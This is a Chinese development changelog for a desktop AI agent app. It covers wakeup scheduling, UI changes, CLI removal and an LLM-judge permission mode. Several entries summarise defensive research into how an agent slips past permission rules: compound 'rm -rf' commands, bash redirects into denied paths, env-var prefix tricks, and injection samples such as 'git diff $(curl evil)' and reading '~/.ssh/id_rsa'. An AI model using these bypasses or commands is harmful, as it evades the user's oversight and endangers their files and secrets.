  1. **挂起 → 自动唤醒**：模型在前台 session A 调 `Bash {timeout_secs: 60}` 启动长跑命令 → 转后台返回 task_id → 模型调 `WaitForTask {task_id}` → agent_loop emit RunSuspended + 落 checkpoint + 退 task → BackgroundTaskPanel 显示「挂起 N 秒 / 1 运行中」徽标 → bash 命令实际结束 → BgFinishHook 检测到终态 → 投递 WakeupEvent → ResumeHandler Tauri-emit `wakeup-fired` → 前端 listener 调 sendUserMessage(wakeup_xml) → 后端 chat 命令检测 checkpoint 走 resume_with → agent_loop emit RunResumed{cause:BgTaskFinished} → 模型继续工作
  2. **挂起 → cron 自动唤醒**：模型调 `ScheduleWakeup {delay_secs: 60, reason: "..."}` → 同样挂起 → 60 秒后 CronTimer 触发 → 后续路径同 (1)
  3. **挂起 → 用户主动发消息**：模型挂起后用户在同 session 发新消息 → chat 命令检测到 checkpoint → resume_with({cause:UserMessageArrived}) → 用户消息正常进入 transcript，新 Run 从 checkpoint 计数器起步
  4. **非前台 session 挂起**：A 挂起后用户切到 B；A 完成时 toast「后台任务已完成：A」+ pendingWakeups[A] 缓存；用户点 A 切回 → openSession 消费 pendingWakeups → 自动 resume
- **留尾巴**:
  - 🟡 wakeup XML 作为 user message 进入 transcript 后会被 jsonl 保存——用户在历史里能看到 `<wakeup kind="..." ...>...</wakeup>` 形式的"用户消息"。可读性其实可以接受（XML 一眼能看出非人为输入），但前端 MessageBubble 可以做一层特殊渲染，把它显示成系统提示样式而非用户气泡。后续优化
  - 🟡 BackgroundTaskPanel 没暴露「kill 指定 task」/「立即触发 cron」按钮——目前 KillShell 工具只有模型调用入口。surface 端可以加 admin 按钮，调一个新 Tauri 命令 `kill_background_task(session_id, task_id)` 包装 BackgroundShells.kill 即可
  - 🟡 进程重启遗留 checkpoint 仍不自动 resume（§13 决策）；UI 没专门提示「上次中断」。`list_background_tasks` 已返回 `has_suspended_checkpoint`，前端可以渲染一个小徽标但暂未做
  - 🟡 CLI/TUI 的 phase: None 占位代码是技术债——后续删 CLI 时一并清理

### 2026-05-13 — Phase 3.5 收尾打磨：wakeup 系统通知样式 + 「上次中断」提示 + 后台任务停止按钮

- **Why**: 闭环跑起来后体验上还有三处突兀点：(1) wakeup XML 作为 user message 进 transcript，UI 把它渲染成普通用户气泡，看起来像"用户发了一坨 XML"；(2) 进程重启遗留 checkpoint 时 UI 没任何提示，用户不知道要发新消息触发恢复；(3) 模型挂起后想要"用户手动停止那个 bash"还得专门跟模型说"调 KillShell"，麻烦
- **改动**:
  - `apps/desktop/frontend/src/desktop/ui/components/MessageBubble.tsx`:
    - 新增 `parseWakeupMessage(content)` + `WakeupNotice` 组件
    - 在 MessageBubble 渲染早期检测 `content.trim().startsWith("<wakeup")`——命中则跳过普通用户气泡，渲染为居中的 amber 系统通知卡片：
      - bg_task_finished：`BellRing` 图标 + 「后台任务 bash_001 完成 · exit 0（12s）」+ 折叠的输出预览
      - cron_fired：`AlarmClock` 图标 + 「定时唤醒：<reason>」+ 折叠的说明
      - 长度 > 240 字符时显示「展开 / 收起」按钮；右上角「复制」按钮可拿到原始 XML 给模型反查
  - 新 Tauri 命令 `kill_background_task(session_id, task_id)`（`apps/desktop/src/lib.rs`）：包装 `BackgroundShells.kill`，返回最终状态字符串；注册进 invoke_handler
  - `apps/desktop/frontend/src/desktop/bridge/tauri.ts`：`api.killBackgroundTask(sessionId, taskId)` 包装
  - `apps/desktop/frontend/src/desktop/ui/components/BackgroundTaskPanel.tsx`:
    - 检测 `orphanedCheckpoint`：`has_suspended_checkpoint && !suspended && !runningShells.length && !pendingCrons.length`——进程重启后 checkpoint 还在但调度器没在等任何事件的典型场景
    - 命中时在面板顶部渲染 orange 警示条「上次会话中断 · checkpoint 已落盘但调度器不在等。发新消息会从中断点继续。」
    - 折叠态药丸的 summary 也加 "上次中断" 后缀
    - `ShellSection` 加 `onKill?: (taskId) => void` prop；运行中的 shell 行右侧加 `Square` 图标按钮，点击触发 toast 反馈
    - 关闭按钮、kill 按钮、AlertCircle 等图标通过 lucide-react 统一引入
- **影响范围**: 仅 surface（前端 + Tauri 命令）；agent-core / protocol 不动；不破坏 jsonl 兼容（wakeup XML 仍是 user message 文本，只是 UI 渲染分支不同）
- **验证**:
  - `cargo test --workspace`：通过
  - `cargo check --workspace`：通过
  - `pnpm exec tsc --noEmit`：通过
- **留尾巴**:
  - 🟡 Sidebar 上没有"上次中断"小徽标——多 session 场景下，用户切到该 session 才会看到 BackgroundTaskPanel 里的提示。后续可以在 list_sessions 返回里包一个 `has_suspended_checkpoint` 标志，Sidebar 渲染小角标
  - 🟡 wakeup XML 渲染目前是只读视图——「展开」也只能看截断到 240 字符之后的内容。完整内容需点「复制」拿到剪贴板。可以考虑做成 ExpandButton 弹大窗口预览，与 ToolPre 一致风格

### 2026-05-13 — 从设计中摘除 CLI / TUI，收敛为 Desktop-only

- **Why**: 项目实际只在维护 apps/desktop 这一个 surface；CLI/TUI 自始至终是"为远期保留 / 给 LLM 自调试"的设计，但 desktop 把所有日常用例都覆盖了，未来不再投入。继续保留两 surface 抽象会让心智模型背负"为不存在的用户写代码"的成本——架构 §0 的"Surface 是壳"原则被 CLI/TUI / Desktop 并列拖累，§7 的"设置分离两份"是纯粹为多 surface 共存设计的接口外壳，§8 的整章 TUI 设计永远不会被实施。摘干净后，crates 内代码与架构.md 都收敛为"只有 Desktop"的清晰心智
- **改动**:
  - [Cargo.toml](../Cargo.toml): `members` 摘掉 `apps/cli`，加 `exclude = ["apps/cli"]`；apps/cli 目录保留作历史档案但不参与 workspace build
  - [crates/agent-core/src/storage/surface_settings.rs](../crates/agent-core/src/storage/surface_settings.rs): 整文件删除（无调用方；`Surface::Cli` / `cli-settings.json` 不复存在）
  - [crates/agent-core/src/storage/mod.rs](../crates/agent-core/src/storage/mod.rs): 移除 `pub mod surface_settings;` + 头注释相应条目；§6.1 "CLI / Desktop 共享" → "Desktop 多窗口/多进程共享"
  - [crates/agent-core/src/core_client/mod.rs](../crates/agent-core/src/core_client/mod.rs): trait + impl 删除 `get_surface_settings` / `save_surface_settings` 两方法，删 `use surface_settings`；模块头注释、`subscribe`/`submit` 报错文案里 "CLI / surface" 措辞按需替换为 "Desktop"；`LocalCoreClient.harness` 字段注释里"CLI 等长生命周期 surface"措辞改为中性版本
  - [crates/agent-core/src/run_mode.rs](../crates/agent-core/src/run_mode.rs): `RunMode::parse` 注释由"从 CLI 字符串解析"改为"从协议字符串解析"——它真正的调用者是 `Op::SwitchRunMode { new_mode: String }` 在 harness actor 路径上的反序列化，与 CLI 命令行无关
  - [crates/agent-core/src/dispatch.rs](../crates/agent-core/src/dispatch.rs): `data_dir_for_artifacts: None` 注释里"少数 CLI / 单测路径"→"单测路径"
  - [apps/desktop/src/lib.rs](../apps/desktop/src/lib.rs): `data_dir` 注释里"CLI 与 Desktop 共享 ~/.hebbian/"→"Desktop 多窗口/多进程共享"
  - [docs/架构.md](架构.md): §0 12 条原则中 #1/#4/#6 收敛措辞；§2.1/§2.2 顶层架构图删 `apps/cli`；§4.9.4 "CLI / Desktop 怎么读" → "Desktop 怎么读"；§6.3.3 文件锁动机改为 "Desktop 多窗口/多进程"；§7.2 "Desktop / CLI 用这个" → "Desktop 用这个"；§7.3 "设置分离（拍板版）" 整节删除，替换为简短"Desktop 设置"段（desktop-settings.json 由 Desktop 自行管，不经 CoreClient）；§7.4 对比表删 surface_settings 那一行；§8 整章 TUI 设计删除（约 210 行）；§10.6 "CLI 单次调试模式" + §10.7 "CLI Resume + Auto-Approve" 删除；§11 文件结构图删 apps/cli + surface_settings.rs 文件名；§12 关键原则汇总 由 14 条缩为 13 条（删 CLI 退出码 + 调整 #8/#9/#13 措辞）；§16.11 TUI 对比表删除，原 §16.12 综合评估合并升格为新的 §16.11
- **影响范围**:
  - agent-core public API：`CoreClient` trait 删 2 个方法（`get/save_surface_settings`）；删 `storage::surface_settings` 模块。**破坏 API**，但实际没有任何 surface 调用过这两个方法，desktop 在 chat.rs / lib.rs 里都不调（grep 已确认），所以是死代码外科切除
  - 协议 / 持久化文件格式：**完全不动**。`session.jsonl` / `settings.json` / `providers.json` 等格式与读写路径都没改；用户磁盘上若已有 `cli-settings.json` 也不会被读，原地保留
  - apps/cli：**不再编译**（被 workspace 排除）。`cargo check --workspace` / `cargo check -p agent-core --tests` / `pnpm exec tsc --noEmit` 三件验证全绿
  - 远期 HttpCoreClient 仍可基于现有 CoreClient trait 实现，不受影响
- **留尾巴**:
  - 🟡 apps/cli 目录里的源码原样保留，但 surface_settings 模块没了之后它自身已经无法 build；保留只为 git 历史回看，**不要试图 `cargo build` 它**。后续彻底确定不再回看时可整目录 `git rm -r apps/cli`
  - 🟡 上一条 changelog（挂起唤醒）里写"CLI/TUI 的 phase: None 占位代码是技术债——后续删 CLI 时一并清理"，本次摘除让那条尾巴部分清掉（CLI 不参与 build 后 phase 全链路始终是 Some）；agent-core 内部 `phase: Option<PhaseChannel>` 字段类型本身仍是 Option，因为单元测试路径仍可以传 None
  - 🟡 RunParams / SessionConfig 中 `data_dir / session_id / recorder / pending_inputs / model_io_dump / phase` 等若干字段仍是 `Option<T>`。讨论中考虑过把 `data_dir / session_id` 收紧为必有，但会牵动单元测试路径的样板代码，且与本次"摘 CLI"主线无关，按 CLAUDE.md "避免顺手 refactor" 暂不动
  - 🟡 架构 §12 原则编号从 14 缩为 13，**没有保留旧编号**；旧 changelog / commit message 里若引用 §12 #13/#14 的位置会失效，但 changelog 是只增不减不回头改

### 2026-05-13 — desktop 输入框上方 hover 提示改为即时显示

- **Why**: 输入框上方的"项目目录 / 目录 / 文件附件 / 模型选择"几个 chip 与按钮，原来用浏览器原生 `title=` 做 hover 提示。原生 title 有 1~2 秒延迟且**无法用 CSS/JS 配置**（不同 OS / 浏览器实现不一），用户反馈"等好几秒才出来"。需要换成可控的自定义 hover 气泡，鼠标移入即出现
- **改动**:
  - [apps/desktop/frontend/src/desktop/ui/components/HoverHint.tsx](../apps/desktop/frontend/src/desktop/ui/components/HoverHint.tsx): 新增轻量组件，基于 React state + mouseenter/leave + `absolute` 定位 + `pointer-events:none` 实现 0 延迟提示；支持 `side=top|bottom` 与 `align=start|center|end` 控制气泡位置，长文本 `whitespace-pre-wrap break-words max-w-[320px]` 自动换行，颜色与项目其他浮层（菜单、附件 pill）一致使用 `bg-card / border-border / shadow-md`
  - [apps/desktop/frontend/src/desktop/ui/components/ChatInput.tsx](../apps/desktop/frontend/src/desktop/ui/components/ChatInput.tsx): workdir chip（"项目：xxx"全路径）与 allowed dir chip（目录全路径）的 `title=` 改为外包 `<HoverHint>`，`align="start"` 让气泡贴左对齐避免遮住右侧 X 按钮
  - [apps/desktop/frontend/src/desktop/ui/components/ModelPickerButton.tsx](../apps/desktop/frontend/src/desktop/ui/components/ModelPickerButton.tsx): 当前模型按钮的 `title=` 改为 `<HoverHint align="end">`，气泡贴按钮右边缘对齐（按钮自身在输入框右下角，右对齐更顺眼）
  - [apps/desktop/frontend/src/desktop/ui/components/AttachmentPreviewStrip.tsx](../apps/desktop/frontend/src/desktop/ui/components/AttachmentPreviewStrip.tsx): 图片缩略图 `ImageThumb` 的 `title={name}` 改为外包 `<HoverHint>`；原 `<div className="relative group/thumb">` 改为 `<span>`（HoverHint 外壳已是 `inline-flex`，避免双层 block）
- **影响范围**:
  - 仅 apps/desktop 前端 UI，不动协议 / agent-core / storage / 类型
  - 不破坏兼容；其余地方的 `title=`（拖拽手柄、菜单项的"更换项目"提示、附件 pill "移除附件"、关闭按钮等）按用户原话不在本次范围内，保持原生 title 不动，需要时再迁移
  - `pnpm exec tsc --noEmit` 通过
- **留尾巴**:
  - 🟡 HoverHint 当前用 `position: absolute` 渲染，处于 `overflow:hidden` 父容器内**会被裁剪**。当前 4 处的父容器都没设 overflow:hidden，实测无问题；若以后要用到下拉菜单内部 / sidebar 等 overflow 容器，可以再改造成 portal + fixed 定位
  - 🟡 未给 `AttachmentPill`（文件类附件 pill）与"+"按钮、"添加项目/目录"菜单项、拖拽手柄等其他位置加 HoverHint。这些原本就有 `title=` 或暂无 hover 信息；本次严格按用户原话只动他提到的 4 处，避免顺手 refactor

### 2026-05-14 — 修复 WakeupScheduler 在 Tauri setup 阶段触发的进程级 abort

- **Why**: Desktop 启动时直接 abort，控制台 panic 信息：
  ```
  thread 'main' panicked at crates/agent-core/src/wakeup.rs:118:
  there is no reactor running, must be called from the context of a Tokio 1.x runtime
  ...
  thread caused non-unwinding panic. aborting.
  ```
  根因：`WakeupScheduler::global()` 内部用 `tokio::spawn` 启动三个后台 task，且这是进程级单例的 lazy-init。Desktop 的 Tauri `setup(...)` 闭包在 macOS NSApplication 的 `did_finish_launching` 回调里**同步**执行，此时主线程**没有 Tokio runtime 上下文**——首次调 `set_resume_handler` 触发 `global()` 初始化，三处 `tokio::spawn` 直接 panic；ObjC 回调禁止 unwind（C ABI），panic 被强制升级为 `abort()`。CLI 模式之所以没炸，是因为 `#[tokio::main]` 在调用前已经建好 runtime——纯属巧合，scheduler 不应该依赖调用方 runtime
- **改动**:
  - [crates/agent-core/src/wakeup.rs](../crates/agent-core/src/wakeup.rs)：`start_background_tasks` 改为 `std::thread::Builder` 起一个命名为 `wakeup-scheduler` 的 OS 线程，线程内 build 一个 `tokio::runtime::Builder::new_current_thread().enable_all().build()` 的独占 runtime，三个原本 `tokio::spawn` 的 task 与 dispatcher 的 `rx.recv()` 循环都跑在这个独占 runtime 上；模块头注释同步说明独立 runtime 的动机
- **影响范围**:
  - 仅 `agent-core::wakeup` 内部实现；对外 API（`global()` / `set_resume_handler` / `arm_cron` / `arm_bg_task` / `register_session_shells` / `discard_run` / `list_pending_crons`）零改动
  - 不影响协议、storage、model-gateway、prompt cache；架构 §4.12 设计语义不变（仍是"进程级单例 + 三 task + 一 mpsc"），只是 task 的 runtime 归属改为 scheduler 自有
  - 与 `observability::init` 的"独占 runtime 跑 OTel 导出 task"思路一致；多出一个 OS 线程 + 一个 current_thread runtime，资源开销可忽略
  - `cargo check --workspace` 与 `cargo check -p agent-core --tests` 均通过
- **留尾巴**:
  - 🟡 这条 panic 之所以能溜进 main：scheduler 的 lazy-init 把"何时启动后台 task"完全交给"谁第一个调 `global()`"决定，调用方对 runtime 上下文这个隐式约束毫无感知。本次改完后 scheduler 自给自足，调用方真正不用关心；但同类隐式契约（"进程级单例 + 内部 spawn"）在其他模块若再出现，建议优先复制本文件的模式而非要求调用方"必须在 runtime 上下文里调"
  - 🟡 独占线程在进程退出时随主进程销毁；scheduler 没有显式 shutdown 路径——和原实现保持一致，符合 §13 "不跨进程 resume" 决策

### 2026-05-14 — 新增「权限/沙箱机制」横向调研文档

- **Why**: 当前 [permissions](../crates/agent-core/src/permissions/mod.rs) + [effects](../crates/agent-core/src/effects.rs) + [hitl](../crates/agent-core/src/tools/hitl.rs) 三件套已能跑通基础审批流，但模型可以用 `cd /tmp && rm -rf foo` 这类**复合命令**绕过单纯的前缀匹配，存在已知风险（fingerprint 是 `cd` 不是 `rm`，规则 `Bash(cd *)` 误放整条）；同时 `timeout 30 git push` 之类的**修饰符前缀**会让规则匹配错位。需要先把外部参考（claude code 二进制 + codex 源码）拆开摆清楚，再决定怎么动 §4.4 / §4.6 / §4.8。本次只产出调研文档与改造方案（P0/P1/P2 分级），不动代码
- **改动**:
  - [docs/权限沙箱-调研.md](权限沙箱-调研.md)：新建文档（10 章）。逐项拆解 claude code 的 tree-sitter AST 拆段、前缀剥离正则栈、危险复合模式分类（cd-git-compound / multi-cd / shell-operators）、macOS SBPL profile 模板、Linux bwrap+seccomp+socat 网络桥、PreToolUse hook + 改写后规则重校验机制、`dangerouslyDisableSandbox` 设计；对比 codex 的 sandbox_policy / approval_policy 正交化；列出 hebbian 已落地组件与未实现项；给 P0（复合命令分段 + 前缀剥离 + 危险模式黑名单）、P1（acceptEdits / WebFetch default-deny / Hook / symlink 检测）、P2（macOS opt-in sandbox-exec）三级改造建议；明确不照搬 5 层 settings 来源 / `dangerouslyDisableSandbox` 入参 / TLS MITM
  - 调研定位与 [compaction.md](compaction.md) 一致：横向背景资料，**不是设计准则**；任何把结论落地的改动仍需走 CLAUDE.md「动手前必做」三步流程，先在 [架构.md](架构.md) §4.4 / §4.5 / §4.6 / §4.8 落定
- **影响范围**: 仅文档，零代码/协议变动；不影响构建、不影响 surface
- **留尾巴**:
  - 🟡 P0-1（复合命令分段）+ P0-2（前缀剥离）+ P0-3（危险复合模式黑名单）是当前最实在的安全提升，预计 effects.rs 局部 200 行内可完成，等用户决策后开工
  - 🟡 P2 macOS sandbox-exec 是否做 / 是否默认开 / 与桌面端的交互方式都需先在架构.md 决策点落定，再开工
  - 🟡 调研物料 `/tmp/claude_strings.txt` 是会话期临时文件，会清理；后续要复查可重新 `strings <native-binary> > <file>` 生成。文档第 9 章已经把关键字符串在 strings 文件里的偏移行号记下来（macOS SBPL profile / Linux bwrap / 前缀剥离正则 / 危险分类 / hook 重校验 / PowerShell 黑名单 / seccomp 限制），即使物料重新生成也能快速回到原位

### 2026-05-14 — 「权限/沙箱机制」调研补研：Auto Mode（LLM Classifier）专章

- **Why**: 第一轮 [权限沙箱-调研.md](权限沙箱-调研.md) 漏了 claude code permissionMode 的 `auto` 那一档对 Bash / Edit 的处理。auto mode 不是普通规则匹配，而是一个独立的 LLM classifier 在做决策——这套机制对"hebbian 要不要往 LLM 辅助审批方向走"的判断非常重要，需要把实现拆透再讨论。第一轮调研用的 2.1.140 二进制本地被升级换成了 2.1.141，借此机会重新 dump strings 并补完 auto mode 这一大块
- **改动**:
  - [docs/权限沙箱-调研.md](权限沙箱-调研.md)：
    - 新增 §2.9「Auto Mode（LLM Classifier 决策）」共 10 个小节：opt-in 机制 / 4 类用户自定义规则（allow/soft_deny/hard_deny/environment）/ 两个独立 classifier（A 前缀提取+注入检测、B 决策主 classifier）/ 两阶段（fast→thinking）/ 失败 fail-closed / 连续 + 累计拒绝上限 / 对 Bash 与 Edit 的具体处理路径 / Telemetry & 调试 / 整体取舍。包含 classifier 完整 prompt 模板（含"鼓励语不解锁拦截"、"防工具切换绕过"两条关键设计），以及 Bash 注入检测 prompt 全文摘录（含 `git diff $(curl evil)` 等 9 个反例）
    - 原 §2.9（`dangerouslyDisableSandbox`）顺移为 §2.10
    - §0 TL;DR 加 auto mode 一句话总结 + classifier 借鉴策略
    - §5 对比矩阵加两行：「LLM Classifier 决策层」、「命令注入检测（LLM 辅助）」
    - §6 借鉴方案新增 §6.4「Auto Mode 单独考量」：分析为什么整套不建议照搬（与 surface 信任模型冲突 / 额外开销 / fail-closed 与 UI 冲突 / prompt-cache 压力），列出可拆出来用的子设计（命令注入检测 AST 版可并入 P0；**Bash 写文件目标识别**——`>` / `cat >` / `sed -i` / `tee` / `python -c "open(...,'w')"` / heredoc 的目标路径塞进 effects.paths 让 FilePath deny 规则统一兜底，提到 **P0+** 优先级——这是当前 hebbian 最大的安全洞之一；"鼓励语不解锁拦截"原则写入架构.md；hard_deny 标签）
    - §8 落地建议表加两步（Bash 写文件目标识别 / 鼓励语原则写入架构.md），调整阶段编号
    - §9 调研物料路径更新二进制版本（2.1.141）+ strings 行数（366008）；新增 Auto Mode 相关 13 个关键字符串偏移行号
- **影响范围**: 仅文档，零代码/协议变动；不影响构建、不影响 surface
- **留尾巴**:
  - 🟡 **§6.4.2 的"Bash 写文件目标识别"提到了 P0+**，是当前 hebbian permissions 模型最实在的一个洞——配置 `Edit(secrets/**) deny` 后模型仍可 `bash: echo x > secrets/y.txt` 绕过。等 P0 复合命令分段落地后立刻补这块
  - 🟡 是否在 hebbian 引入"鼓励语不解锁拦截"作为 §0 原则需要先与用户确认。这条原则会让 hebbian 在用户说"放手做"时反而不该自动放权，与 surface 信任模型有微妙张力，需要单独讨论
  - 🟡 Auto Mode 的整套 classifier 机制本身不进 hebbian 主路线（§6.4.1 已分析理由），但 hard_deny 标签如果做最小版本（UI 上把 deny 与 hard_deny 区分显示），可以在 P1 阶段加进 PermissionRule 数据结构

### 2026-05-14 — 调研补研：Classifier A（Bash 前缀提取）展开

- **Why**: 用户提示之前只笼统说"Classifier A 提取 prefix"，没讲清楚为什么需要 LLM、什么时候第二个 token（subcommand verb）会进 prefix、什么时候不会。这一层是 claude code 整套机制里最巧妙也最容易低估的设计——它不做 allow/deny 决策，但决定了 allowlist 规则的合理粒度，hebbian 借鉴时必须吃透
- **改动**:
  - [docs/权限沙箱-调研.md](权限沙箱-调研.md) §2.9.4 Classifier A 子节大幅展开：
    - 加「设计本质：粒度问题，不是语法问题」前置说明——dispatcher (git/npm) vs unitary (cat/find) 的 LLM 推断是无法用纯正则做的核心理由
    - prompt 全文 28 个 example 重新按 5 类规律分组：单命令风格 / dispatcher 风格 / dispatcher 裸调用 → none / env var 整段保留 / 命令注入
    - 加 6 条「关键判断」子节：(1) dispatcher vs unitary 二分；(2) 为什么 `git push` 返回 none 而 `git push origin master` 返回 `git push`（"prefix 必须 specific 才能形成 allowlist"反直觉设计）；(3) 参数不进 prefix（截止在 verb）；(4) 环境变量整段保留及理由（防 `PYTHONPATH=/tmp python3` / `NODE_TLS_REJECT_UNAUTHORIZED=0` 这类语义偷换）；(5) 路径/脚本参数即使在 dispatcher 之后也不进 prefix；(6) 命令注入 4 种形态（`$()` / 反引号 / 注释+反引号 / 换行裸命令 / 进程替换）与原文核心定义
    - 加「这套设计避开的纯规则解法的坑」子节：5 个 corner case 解释为什么必须用 LLM 而不是硬编码 dispatcher 列表
    - 加「在整体决策链里的位置」流程图，明确 Classifier A 在 auto mode 关闭时也跑（不限 auto mode）
    - 加「与 hebbian 当前 shell_parse 的差距（具体到这一层）」分析：当前 fingerprint 取首个 token 导致 `BashCommandPrefix: "git commit"` 永远不命中、`PYTHONPATH=/tmp python3` 这类 fingerprint 错位等具体问题
    - **给出 hebbian 第一阶段不上 LLM 的混合实现规范**：剥离修饰符 → 收集 env var → 取 base → 在硬编码 dispatcher 列表里查（git/npm/yarn/cargo/docker/kubectl/gh/aws 约 20 项）决定是否取 verb → 注入检测；覆盖 80% case，dispatcher 列表外按 unitary 处理，未来需要再升 LLM
- **影响范围**: 仅文档；不动代码
- **留尾巴**:
  - 🟡 dispatcher 硬编码列表的具体清单（哪些工具进、哪些不进）需要在 P0-2 实施时与用户对齐。建议起步：`git npm yarn pnpm cargo rustc docker kubectl helm gh aws gcloud terraform go bun deno pip uvx make ninja`
  - 🟡 这套混合实现"未知工具按 unitary 处理"是有意权衡（牺牲 dispatcher 推断换代价控制），实施前要在架构.md §4.6 落定这条约束，避免后续 agent 误以为是 bug
  - 🟡 Bash 命令注入检测的 AST 实现细节（process_substitution 节点 / 反引号 token / 换行裸命令）建议在 P0-1（复合命令分段）的同一次 PR 里做，共用 tree-sitter-bash 解析结果


### 2026-05-19 — AutoMode 判官升级：扩白名单 + effects 注入 prompt + ASK 段级拆解 + `--force-automode` 子开关

- **Why**: 用户要求按 claude code Classifier B / codex 自动审查的设计哲学把 AutoMode 判官升级到真正能用。原 prompt 是 22 行简版、模型白名单只有 `claude-opus-4-7`、判官也看不到 hebbian 静态分析（segments / dangerous_kinds），导致：
  1. 判官不知道用户已识别的危险信号（cd-git-compound / write-git-meta / rm-rf-root / sensitive-env-prefix），可能"凭直觉"重复判定
  2. 用户口里的 gpt-5.5 没办法用 AutoMode
  3. 危险命令默认 DENY 太武断——用户运维场景就是想跑 `rm -rf` 这类，应当 ASK + 让用户拍板
  4. "放手跑、不打断我"的场景没法表达——CLI 起来后所有 ASK 都打断 agent，违背初衷
- **改动**:
  - [docs/架构.md](架构.md): §4.4.4 重写 AutoMode 实现细节（模型白名单、判官输入端扩 effects、判官设计原则 6 条、`force_automode` 子开关说明）；§13 决策表追加 4 行（模型白名单 / DENY 边界 / ASK reason 格式 / force_automode 子开关）
  - [crates/agent-core/prompts/automode_judge.md](../crates/agent-core/prompts/automode_judge.md): 整段重写（英文，~120 行）。新结构：Inputs / Verdicts (ALLOW/DENY/ASK 各档触发条件)/ ASK 段级拆解示例 / Hard rules 5 条 / Output format strict。借鉴 CC Classifier B 的「鼓励语不解锁」「工具切换绕过」「fail-closed」原则，但 DENY 边界收紧到只覆盖 ast-too-complex + 无意图——其它危险动作一律 ASK
  - [crates/agent-core/src/automode.rs](../crates/agent-core/src/automode.rs): `AUTOMODE_REQUIRED_MODEL` (单一字符串) → `AUTOMODE_ALLOWED_MODELS: &[&str]` (白名单 substring 匹配，容忍 `claude-opus-4-7-20260416` 这类日期变体)；`judge_auto_mode` 签名加 `effects: &Effects` 参数；`format_judge_prompt` 注入 `segments[*]` / `paths` / `dangerous_kinds` / `network` / `class`；`max_tokens` 200 → 300（ASK reason 要按段拆解）；新增 `AutoModeDecision::collapse_ask_to_deny()`，把 Ask 折叠为 Deny 时在 reason 头部加 `force-automode:` 前缀；单测覆盖白名单 + collapse
  - [crates/agent-core/src/dispatch.rs](../crates/agent-core/src/dispatch.rs): `ToolDispatcher` 加 `force_automode: bool` 字段；AutoMode 分支调 `judge_auto_mode` 时多传 `&effects`，拿到 raw decision 后按 `force_automode` 调 `collapse_ask_to_deny`，再 emit / resolve
  - [crates/agent-core/src/session.rs](../crates/agent-core/src/session.rs): `SessionConfig` 与 `Session` 都加 `force_automode: bool` 字段 + getter `force_automode()` + setter `set_force_automode()`；`run_with_pending` / `resume_with` 透传给 `RunParams`
  - [crates/agent-core/src/agent_loop.rs](../crates/agent-core/src/agent_loop.rs): `LoopParams` 加 `force_automode` 字段；构造 `ToolDispatcher` 时传过去；测试 / harness 处补 default `false`
  - [crates/agent-core/src/harness.rs](../crates/agent-core/src/harness.rs): `RunParams` 加 `force_automode`，`spawn_run` 解构 + 传 `LoopParams`
  - [apps/cli/src/main.rs](../apps/cli/src/main.rs): 加 `--force-automode` clap flag，传给 `CliSession::new`
  - [apps/cli/src/session.rs](../apps/cli/src/session.rs): `CliSession::new` 加 `force_automode: bool` 参数 → 灌进 `SessionConfig`；REPL loop 加 `/force-automode [on|off|toggle|status]` 命令（toggle/无参 = 取反）；启动期顺手补上之前 c80c983 commit 漏写的 `SessionConfig.phase: None` 字段（CLI 不接入挂起通道，与架构 §4.12 一致）
  - [apps/desktop/src/chat.rs](../apps/desktop/src/chat.rs): `SessionConfig` 字面量补 `force_automode: false`（Desktop UI 切换由后续单独 PR 跟）
  - [crates/agent-core/src/tools/shell_parse.rs](../crates/agent-core/src/tools/shell_parse.rs): 顺手修两个上次 c80c983 重写没收尾的 bug
    1. `strip_prefix` 的内层 `if SCHED_MODIFIERS.contains(...) {` 缺右大括号 + `'outer: loop {` 缺退出条件和闭合 → 整个文件 unclosed delimiter，cargo check 失败
    2. fd 复制 (`2>&1` / `1>&2`) 的 `&N` 在 op 之后被 `scan_token` 拒绝后**只跳过了 op 字符**，`&1` 残留进 cleaned 让 `sniff_complex_structure` 误判为后台 `&` → 加 `scan_fd_dup` helper 整段吞掉 `&[0-9]+` / `&-`
- **影响范围**:
  - 协议无变化（`PermissionAutoJudged` payload 字段不变，只是 reason 文本现在带段级拆解）
  - `SessionConfig` / `RunParams` / `LoopParams` / `ToolDispatcher` 多了一个公开字段 → desktop / CLI / agent-core test 三处构造点必须补；其它 surface（远期 HttpCoreClient）按需透传
  - prompt 文件二进制内嵌（`include_str!`），prompt cache 用户首次跑 AutoMode 会重建一次
  - AutoMode 单次判官调用 token 略涨：原 prompt ~22 行 → 现 ~120 行，加上 effects 注入用户消息约多 200-400 token，但 ASK reason 按段拆解后用户体验质变（之前是"我不确定，让人决定" → 现在是"段 1 cd /etc 切到系统配置目录、段 2 cat ~/.ssh/id_rsa 读取 SSH 私钥..."）
- **留尾巴**:
  - 🟡 Desktop UI 没接 `force_automode` 切换按钮（后端字段已透传到 SessionConfig，前端单独 PR 跟）
  - 🟡 TUI 状态栏没显示 `force_automode` 状态（CLI 启动 `--force-automode` 锁定 + REPL `/force-automode` 切换已足够；TUI 用户想运行时切要回 REPL）
  - 🟡 模型白名单是 substring 匹配。`gpt-5.5-something-experimental` 这种带后缀的命名也会被命中——以后 OpenAI 推 `gpt-5.5-mini` 这种"基础名相同但能力差很多"的模型时需要把白名单收紧成 exact match 或 regex
  - 🟡 判官输出现在严格要求英文格式头 (`ALLOW` / `DENY:` / `ASK:`)。如果未来 gpt-5.5 在某些 locale 下偶发首行翻译成 "允许" / "拒绝"，会被 `parse_decision` 兜底为 Ask（fail-closed 正确，但用户体验扣分）—— 观察期后如果发现可考虑给 prompt 加一条 negative example
  - 🟡 shell_parse.rs 的 `strip_prefix` 闭合 + fd dup 两个修复属于"撞到了上次没做完的工作"，不是本次 AutoMode 任务范围。已通过 cargo test (31/31 shell_parse + 165/165 agent-core lib) 验证回归覆盖
- **关联**: 架构 §4.4.4 / §13；调研 §2.9 (CC Classifier B) / §3 (codex approval_policy 三态) / §6.4 (借鉴方案矩阵)

### 2026-05-19 — 调整项目入口与项目 chip 图标

- **Why**: 用户希望左上角「项目 / 全部」筛选按钮的图标更贴合语义，同时输入框上方的项目标识要和目录 chip 区分开，避免项目看起来像普通文件夹目录
- **改动**:
  - [apps/desktop/frontend/src/desktop/ui/components/Sidebar.tsx](../apps/desktop/frontend/src/desktop/ui/components/Sidebar.tsx): 「项目」筛选改为公文包项目图标，「全部」筛选改为多对话图标，保留「新建对话」的加号对话图标
  - [apps/desktop/frontend/src/desktop/ui/components/ChatInput.tsx](../apps/desktop/frontend/src/desktop/ui/components/ChatInput.tsx): 项目 chip 改用公文包项目图标，目录 chip 继续使用文件夹图标
- **影响范围**: 仅 Desktop 前端展示；不改协议、不改持久化、不影响已有项目/会话数据
- **留尾巴**: 无

### 2026-05-19 — 调整输入框项目 chip 的路径 hover 展示

